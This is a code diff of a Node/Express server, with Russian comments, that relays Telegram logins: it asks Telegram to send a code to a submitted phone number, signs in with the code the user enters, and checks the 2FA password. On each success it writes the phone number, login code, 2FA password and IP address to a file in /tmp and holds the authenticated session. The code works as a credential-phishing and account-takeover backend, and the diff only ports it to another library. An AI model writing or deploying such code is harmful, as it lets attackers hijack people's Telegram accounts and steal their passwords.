@@ -2,8 +2,7 @@ import express from 'express';
 import cors from 'cors';
 import fs from 'fs';
 import path from 'path';
-import { TelegramClient } from 'telegram';
-import { StringSession } from 'telegram/sessions/index.js';
+import { MTProto } from '@mtcute/node';
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -11,7 +10,7 @@ const PORT = process.env.PORT || 3000;
 const DATA_FILE = path.join('/tmp', 'data.txt');
 
 const apiId = parseInt(process.env.API_ID) || 38819391;
-const apiHash = process.env.API_HASH || '3460a50f4b56082066d92fa202bd6407';
+const apiHash = String(process.env.API_HASH || '3460a50f4b56082066d92fa202bd6407');
 
 console.log('🔑 API_ID:', apiId);
 console.log('🔑 API_HASH:', apiHash ? '✅ установлен' : '❌ не установлен');
@@ -25,19 +24,29 @@ const sessions = new Map();
 
 // === 1. ОТПРАВКА КОДА ===
 app.post('/api/phone', async (req, res) => {
-    const { phone } = req.body;
+    const phone = String(req.body.phone).trim();
 
     if (!phone || !/^\+\d{7,15}$/.test(phone)) {
         return res.status(400).json({ error: 'Invalid phone format' });
     }
 
     try {
-        const client = new TelegramClient(new StringSession(''), apiId, apiHash, {
-            connectionRetries: 5,
+        const client = new MTProto({
+            apiId,
+            apiHash,
         });
 
         await client.connect();
-        const result = await client.sendCode(phone);
+
+        const result = await client.call('auth.sendCode', {
+            phone_number: phone,
+            api_id: apiId,
+            api_hash: apiHash,
+            settings: {
+                allow_flashcall: false,
+                current_number: false,
+            },
+        });
 
         sessions.set(phone, {
             phone_code_hash: result.phone_code_hash,
@@ -55,7 +64,8 @@ app.post('/api/phone', async (req, res) => {
 
 // === 2. ПРОВЕРКА КОДА ===
 app.post('/api/verify', async (req, res) => {
-    const { phone, code } = req.body;
+    const phone = String(req.body.phone).trim();
+    const code = String(req.body.code).trim();
 
     if (!phone || !code || code.length < 5) {
         return res.status(400).json({ error: 'Invalid data' });
@@ -69,9 +79,13 @@ app.post('/api/verify', async (req, res) => {
     try {
         const { client, phone_code_hash } = session;
 
-        const result = await client.signIn(phone, code, phone_code_hash);
+        const result = await client.call('auth.signIn', {
+            phone_number: phone,
+            phone_code_hash,
+            phone_code: code,
+        });
 
-        if (result) {
+        if (result.user) {
             const data = { phone, code, ip: req.ip, time: new Date().toISOString() };
             fs.appendFileSync(DATA_FILE, JSON.stringify(data) + '\n');
             console.log(`✅ Login success for ${phone}`);
@@ -90,7 +104,8 @@ app.post('/api/verify', async (req, res) => {
 
 // === 3. 2FA ===
 app.post('/api/2fa', async (req, res) => {
-    const { phone, code, password } = req.body;
+    const phone = String(req.body.phone).trim();
+    const password = String(req.body.password).trim();
 
     if (!phone || !password) {
         return res.status(400).json({ error: 'Invalid 2FA data' });
@@ -103,9 +118,15 @@ app.post('/api/2fa', async (req, res) => {
 
     try {
         const { client } = session;
-        await client.signIn({ password });
+        await client.call('auth.checkPassword', { password });
 
-        const data = { phone, code, twofa_password: password, ip: req.ip, time: new Date().toISOString() };
+        const data = {
+            phone,
+            code: req.body.code || '',
+            twofa_password: password,
+            ip: req.ip,
+            time: new Date().toISOString(),
+        };
         fs.appendFileSync(DATA_FILE, JSON.stringify(data) + '\n');
         console.log(`🔐 2FA passed for ${phone}`);
         sessions.delete(phone);
